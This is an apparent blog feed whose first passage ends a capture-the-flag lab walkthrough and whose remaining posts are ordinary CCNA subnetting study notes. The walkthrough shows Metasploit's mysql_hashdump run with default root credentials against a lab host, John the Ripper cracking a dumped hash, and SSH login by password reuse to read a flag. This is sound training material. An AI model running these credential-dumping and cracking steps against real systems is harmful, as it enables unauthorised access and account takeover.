</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>it.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: carl:_EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>_<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called &ldquo;hash.txt&rdquo;.
What is the user/hash combination string?</p>






<pre tabindex="0"><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
<br>
<p>Now, we need to crack the password! Let&rsquo;s try <code>John the Ripper</code> against it using: <code>john hash.txt</code>. What is the password of the user we found?</p>






<pre tabindex="0"><code>doggie</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# cat &gt; hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-35-22:~# cat hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-35-22:~# john hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Warning: detected <span style="color:#89dceb">hash</span> <span style="color:#89dceb">type</span> <span style="color:#a6e3a1">&#34;mysql-sha1&#34;</span>, but the string is also recognized as <span style="color:#a6e3a1">&#34;mysql-sha1-opencl&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Use the <span style="color:#a6e3a1">&#34;--format=mysql-sha1-opencl&#34;</span> option to force loading these as that <span style="color:#89dceb">type</span> instead
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>mysql-sha1, MySQL 4.1+ <span style="color:#89dceb;font-weight:bold">[</span>SHA1 256/256 AVX2 8x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Proceeding with single, rules:Single
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Warning: Only <span style="color:#fab387">2</span> candidates buffered <span style="color:#cba6f7">for</span> the current salt, minimum <span style="color:#fab387">8</span> needed <span style="color:#cba6f7">for</span> performance.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Almost <span style="color:#cba6f7">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#cba6f7">if</span> any.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Proceeding with wordlist:/opt/john/password.lst
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Proceeding with incremental:ASCII
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>doggie <span style="color:#89dceb;font-weight:bold">(</span>carl<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>1g 0:00:00:01 DONE 3/3 <span style="color:#89dceb;font-weight:bold">(</span>2024-06-26 06:01<span style="color:#89dceb;font-weight:bold">)</span> 0.5291g/s 1209Kp/s 1209Kc/s 1209KC/s doggie..doggia
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Session completed.</span></span></code></pre></div>
<br>
<p>Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What&rsquo;s the contents of MySQL.txt?</p>






<pre tabindex="0"><code>THM{congratulations_you_got_the_mySQL_flag}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh carl@10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl@10.10.151.196<span style="color:#f38ba8">&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-96-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 05:04:05 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>System load: 0.0 Processes: <span style="color:#fab387">87</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Usage of /: 41.7% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Memory usage: 32% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#fab387">23</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Last login: Thu Apr <span style="color:#fab387">23</span> 12:57:41 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>carl@polomysql:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>carl@polomysql:~$ cat MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>congratulations_you_got_the_mySQL_flag<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Subnetting 2</title>
      <link>http://localhost:1313/til-subnetting-2/</link>
      <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-subnetting-2/</guid>
      <description>Divide the 192.168.1.0/24 network into 4 subnets that can accommodate 45 number of hosts.
First, we determined that the prefix length needs to be /26 because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is 2^n - 2, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./image-30.png"></div>
<p>Divide the <code>192.168.1.0/24</code> network into 4 subnets that can accommodate 45 number of hosts.</p>
<p>First, we determined that the prefix length needs to be <code>/26</code> because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts. Therefore, we need 2^6 - 2 = 62, which isn&rsquo;t exactly 45 but is sufficient. To accommodate 45 hosts, we need 6 host bits. This makes the prefix length /26, since we subtract the 6 host bits from the total address length of 32.</p>
<p>The network address of <code>subnet 1</code> is 192.168.1.0/26. To find the broadcast address of subnet 1, we first convert the subnet 1 address to binary:
<code>11000000.10101000.00000001.00000000</code></p>
<p>Then, we change all the Host ID bits to 1, leaving the Network ID bits unchanged:
<code>11000000.10101000.00000001.00111111</code></p>
<p>Converting these binary bits back to dotted decimal format gives us the broadcast address (the highest address in this subnet) of subnet 1.
<code>192.168.1.63/26</code>.</p>
<p>So, the address range of subnet1 is 192.168.1.0 - 192.168.1.63.</p>
<p>The network address of <code>subnet 2</code> will be 1 higher than the broadcast address of <code>subnet 1</code>. So, 192.168.1.64/26.</p>
<p>192.168.1.64 in binary is <code>11000000.10101000.00000001.01000000</code>.
Covert all the host bits to 1s. <code>11000000.10101000.00000001.01111111</code></p>
<p>Convert the binary bits back to dotted decimal and it becomes <code>192.168.1.127</code>.</p>
<p>The address range of subnet 2 is 192.168.1.64 to 192.168.1.127.</p>
<p>You might have noticed that each subnet is 64 bits apart. To find next subnet&rsquo;s network address, simply add this value to the current subnet.</p>
<p>Take the image below as an example.</p>
<div style="text-align: center"><img src="./image-31.png"></div>
<p>Let&rsquo;s just focus on the last octet here. The last octet in binary is <code>00000000</code>. The first 2 bits is the network ID, which we borrowed to expand the network ID and the last 6 bits is the host ID. The trick to find each subnet&rsquo;s network address is to remember the value of last bit of the network portion, which is 64, in this case.</p>
<br>
<br>
<br>
<div style="text-align: center"><img src="./image-32.png"></div>
For the number of subnets, each additional bit that you borrow doubles the number of subnets.
<h3 id="subnetting-class-b-networks">Subnetting Class B Networks</h3>
<ol>
<li>
<p>You have been given the 172.16.0.0/16 network. You are asked to create 80 subnets for your company&rsquo;s various LANs. What prefix length should you use?</p>
<p>2^x = number of subnets, where x is the number of &lsquo;borrowed&rsquo; bits.</p>
</li>
</ol>
<div style="text-align: center"><img src="./image-33.png"></div>
we have to borrow 7 bits. 16 + 7 = /23.
<ol start="2">
<li>You have been given the <code>172.22.0.0/16</code> network. You are required to divide the network into 500 separate subnets. What prefix should you use?</li>
</ol>
<p>First of all, looking at the /16 prefix length, it seems like subnetting needs to be done in a Class B network. To create 500 subnets, we need to determine how many bits to borrow.</p>
<p>2^8 is 256, and 2^9 is 512. Therefore, we need to borrow 9 bits. Starting from a Class B network, which has a /16 prefix length, we add 9 bits to get a /25 prefix length. This means we should use a /25 prefix length.</p>
<ol start="3">
<li>You have been given the <code>172.18.0.0/16</code> network. Your company requires 250 subnets with the same number of hosts per subnet. What prefix length should you use?</li>
</ol>
<p><code>/24</code> . 2^8 = 256 subnets could be made. Also /24 prefix length will leave 8, the number of host bits which could lead to 2^8 - 2, 254.</p>
<ol start="4">
<li>
<p>What subnet does host 172.25.217.192/21 belong to?</p>
<p>Let&rsquo;s convert <code>172.25.217.192</code> to binary bits.
10101100.00011001.11011001.11000000</p>
<p>change all of the host bits to 0.
10101100.00011001.11011000.00000000</p>
<p>change it back to dotted decimal.
172.25.216.0/21</p>
</li>
</ol>
<h3 id="quiz">Quiz</h3>
<hr>
<p>Q1. You have been given the <code>172.30.0.0/16</code> network. Your company requires 100 subnets with at least 500 hosts per subnet. What prefix length should you use?</p>






<pre tabindex="0"><code>/23</code></pre>
<br>
<p>Q2. What subnet does host <code>172.21.111.201/20</code> belong to?</p>






<pre tabindex="0"><code>172.21.96.0/20</code></pre>
<ul>
<li>Convert the address to binary: <code>10101100.00010101.01101111.11001001</code></li>
<li>Change the host bits to 0s. Since the prefix length is <code>/20</code> , we can set the last 12 bits to 0s: <code>10101100.00010101.01100000.00000000</code></li>
<li>Convert the binary bits back to dotted decimal: <code>172.21.96.0/20</code></li>
</ul>
<br>
<p>Q3. What is the broadcast address of the network 192.168.91.78/26 belongs to?</p>






<pre tabindex="0"><code>192.168.91.127/26</code></pre>
<ul>
<li>Convert the address to binary bits:
<ul>
<li><code>11000000.10101000.01011011.01001110</code>.</li>
</ul>
</li>
<li>Change all of the host bits to 0s to find the network address of the subnet:
<ul>
<li><code>11000000.10101000.01011011.01000000</code>.</li>
</ul>
</li>
<li>Change all of the host bits to 1s to find the broadcast address of the subnet:
<ul>
<li><code>11000000.10101000.01011011.01111111</code>.</li>
</ul>
</li>
<li>Change the binary bits back to dotted decimal
<ul>
<li>network address: 192.168.91.64/26</li>
<li>broadcast address: 192.168.91.127/26</li>
</ul>
</li>
</ul>
<br>
<p>Q4. You divide the <code>172.16.0.0/16</code> network into 4 subnets of equal size. Identify the network and broadcast addresses of the second subnet.</p>






<pre tabindex="0"><code>network address: 172.16.64.0/18
broadcast address: 172.16.127.255/18</code></pre>
<ul>
<li>The original subnet mask for a /16 network is 255.255.0.0.</li>
<li>Dividing into 4 subnets require 2 additional bits for subnetting (2^2 = 4).</li>
<li>This changes the subnet mask to 255.255.192.0 /18.</li>
<li>The original network 172.16.0.0/16 is divided as follows with a /18 mask:
<ul>
<li>subnet1: 172.16.0.0/18</li>
<li>subnet2: 172.16.64.0/18</li>
<li>subnet3: 172.16.128.0/18</li>
<li>subnet4: 172.16.192.0/18</li>
</ul>
</li>
<li>We know that subnet 2&rsquo;s broadcast address is just 1 below subnet 3&rsquo;s network address: 172.16.127.255/18</li>
</ul>
<br>
<p>Q5. You divide the 172.30.0.0/16 network into subnets of 1000 hosts each. How many subnets are you able to make?</p>






<pre tabindex="0"><code>64</code></pre>
<p>To divide the network into subnets that each accommodate 1,000 hosts, we first need to determine how many bits are required for the hosts. The formula for calculating the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If we use 10 bits for the hosts, we get 2^10 - 2 = 1,022 hosts, which is more than enough.</p>
<p>The maximum prefix length is /32. Subtracting the 10 host bits from 32 gives us a prefix length of /22. Therefore, the subnet mask of the subnets will be /22. The original subnet mask was /16, so we&rsquo;ve borrowed 6 bits from the original network for subnetting. With these 6 additional bits, we can create 64 (2^6) subnets.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Subnetting</title>
      <link>http://localhost:1313/til-subnetting-1/</link>
      <pubDate>Tue, 25 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-subnetting-1/</guid>
      <description>Today marks day 13 of studying CCNA with Jeremy&amp;rsquo;s IT Lab. Today&amp;rsquo;s topic was subnetting. Even though the topic was challenging to grasp at first, it&amp;rsquo;s really interesting how people came up with such ideas to efficiently utilize the IP addressing system. People are geniuses!
IPv4 Address Classes There are 5 different IPv4 classes
A subnet refers to a portioned network within an IP address that divides the network area. The tool used to create these subnets is called a Subnet Mask.</description>
      <content:encoded><![CDATA[<p>Today marks day 13 of studying CCNA with Jeremy&rsquo;s IT Lab. Today&rsquo;s topic was subnetting. Even though the topic was challenging to grasp at first, it&rsquo;s really interesting how people came up with such ideas to efficiently utilize the IP addressing system. People are geniuses!</p>
<div style="text-align: center"><img src="./big-brain-super-smart.gif"></div>
<hr>
<h3 id="ipv4-address-classes">IPv4 Address Classes</h3>
<p>There are 5 different IPv4 classes</p>
<div style="text-align: center"><img src="./ip table.png"></div>
<p>A <code>subnet</code> refers to a portioned network within an IP address that divides the network area. The tool used to create these subnets is called a <code>Subnet Mask</code>. In other words, the Subnet Mask serves to separate the Network ID and the Host ID within the IP address system.</p>
<p>For example, as shown in the image above, a <code>Class C</code> network has the first 24 bits representing the Network ID and the last 8 bits representing the Host ID. In this case, the actual number of assignable hosts within the 8-bit Host ID is 2^8 - 2 = 254.</p>
<p>The formula for the actual number of assignable hosts is <code>2^n - 2</code>, where n is the number of bits in the Host ID. But why do we subtract 2? This is because we must exclude the <code>Network Address</code> and the <code>Broadcast Address</code>. These two addresses cannot be assigned to hosts.</p>
<br>
<h3 id="cidr-classless-inter-domain-routing">CIDR (Classless Inter-Domain Routing)</h3>
<p>The class system has a critical problem, that is, it wastes a lot of IP addresses. When the Internet was first created, the creators did not predict that the Internet would become as large as it is today. This resulted in wasted address space.</p>
<p>The IETF (Internet Engineering Task Force) introduced CIDR in 1993 to replace the &lsquo;classful&rsquo; addressing system.</p>
<p>With CIDR, the requirements of</p>
<ul>
<li>Class A = /8</li>
<li>Class B = /16</li>
<li>Class C = /24</li>
</ul>
<p>were removed. This allowed larger networks to be split into smaller networks, allowing greater efficiency. These small networks are called <code>subnetworks</code> or <code>subnets</code> .</p>
<br>
<p>Wasted IP addresses example</p>
<div style="text-align: center"><img src="./image-23.png"></div>
<p>Here, we have two routers that we want to connect. This network is a <code>point-to-point</code> network, so we don&rsquo;t need many network blocks. Therefore, we allocate a Class C network. Since we allocated a Class C network, the Network ID will be 24 bits, and the Host ID will be 8 bits, giving us a total of 2^8 = 256 addresses. However, subtracting the network address (203.0.113.0) and the broadcast address (203.0.113.255), we have a total of 254 usable addresses.</p>
<p>But let&rsquo;s say we are using the classful addressing system without CIDR introduced. In this case, out of the 254 addresses, if we assign one address to R1 (e.g., 203.0.113.1) and one address to R2 (e.g., 203.0.113.2), then 252 addresses will be unused and wasted.</p>
<p>Let&rsquo;s look at another example.</p>
<p>Company X needs IP addresses to connect 5000 end hosts. Since Class C can only allocate 2^8-2, or 254 addresses, we would have to allocate a Class B to X. A Class B provides 2^16-2, or 65,534 addresses. This means Company X, which only needs 5000 addresses, would waste over 60,000 IP addresses.</p>
<h3 id="subnetting">Subnetting</h3>
<div style="text-align: center"><img src="./image-24.png"></div>
<p>Due to the waste of too many IP addresses, subnetting is essential. Returning to the same example, let&rsquo;s assign IP addresses to this point-to-point network using <code>/30</code> (which is a subnet of that larger Class C network).</p>
